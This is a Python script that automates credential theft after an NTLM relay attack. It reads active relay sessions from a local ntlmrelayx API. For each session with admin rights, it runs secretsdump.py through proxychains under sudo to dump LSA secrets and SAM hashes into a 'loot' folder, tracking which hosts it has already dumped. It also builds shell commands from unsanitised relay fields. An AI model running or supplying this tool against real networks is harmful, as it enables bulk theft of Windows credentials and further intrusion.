# this tool will dump all admin relays lsa secrets and sam
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import os, sys, json


cwd = os.path.abspath(os.path.dirname(__file__))
dumped_ips = []

if __name__ == '__main__':
    if os.path.isfile('secretsdump.py') == False:
        print('Missing secretsdump.py in current directory')
        sys.exit(1)
        
    if os.path.isfile('dumped_ips'):
        with open('dumped_ips', 'r') as f:
            dat = f.read()
            dumped_ips = dat.split('\n')

    headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
    url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
    try:
        proxy_handler = ProxyHandler({})
        opener = build_opener(proxy_handler)
        response = Request(url)
        r = opener.open(response)
        result = r.read()

        items = json.loads(result)
    except Exception as e:
        print("ERROR: %s" % str(e))
    else:
        if len(items) > 0:

            tmp = result.decode()
            tmp = tmp.replace('[', '')
            tmp = tmp.replace('"', '')
            tmp = tmp.replace('\n', '')
            tmp = tmp.split('],')

            # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus

            if os.path.isdir(cwd + "/loot") == False:
                os.makedirs(cwd + "/loot")

            for item in tmp:
                dat = item.replace(']', '').split(',')
                if dat[3] == 'TRUE':
                    if dat[1] not in dumped_ips:
                        dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice
                        os.system('sudo mkdir {}/loot/{}'.format(cwd, dat[1]))
                        # lsa secrets and sam dump courtesy of secretsdump
                        try:
                            os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}/{}\''.format(dat[2], dat[1], cwd, dat[1], dat[1]))
                            with open('dumped_ips', 'a') as f:
                                f.write(dat[1] + '\n')
                        except Exception as e:
                            print(str(e))
                            print('Error dumping secrets')


        else:
            print('No Relays Available!')
            
